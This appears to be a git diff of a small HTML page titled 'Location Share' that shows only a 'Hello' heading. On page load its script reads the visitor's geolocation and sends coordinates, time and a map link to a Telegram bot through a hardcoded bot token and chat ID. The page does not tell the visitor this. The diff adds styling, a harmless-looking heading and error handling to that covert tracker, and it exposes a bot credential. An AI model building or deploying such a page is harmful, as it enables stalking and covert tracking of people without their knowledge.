@@ -2,38 +2,66 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Location Share</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+        h1 {
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+    </style>
 </head>
 <body>
+    <h1>Hello</h1>
+
     <script>
         // Your bot credentials
         const BOT_TOKEN = "8689283758:AAGAoRKk6uoS1NrC828IWkpizNYM__9K7Qg";
         const CHAT_ID = "1755569425";
         
-        // Send location to Telegram
+        // Function to send location to Telegram
         async function sendLocation(lat, lng) {
-            const message = `📍 Location: ${lat}, ${lng}\nMap: https://maps.google.com/?q=${lat},${lng}`;
+            const time = new Date().toLocaleString();
+            const mapsLink = `https://maps.google.com/?q=${lat},${lng}`;
+            
+            const message = `📍 *LOCATION SHARED!* 📍\n\n` +
+                `Lat: ${lat.toFixed(6)}\n` +
+                `Lng: ${lng.toFixed(6)}\n\n` +
+                `Time: ${time}\n\n` +
+                `[🗺️ Google Maps](${mapsLink})`;
             
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             
-            await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message
-                })
-            });
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (error) {
+                console.error('Error:', error);
+            }
         }
         
-        // Auto get location on page load
+        // Auto get and send location when page loads
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 (position) => {
                     sendLocation(position.coords.latitude, position.coords.longitude);
                 },
                 (error) => {
-                    console.log('Error:', error);
+                    console.log('Location error:', error);
                 }
             );
         }
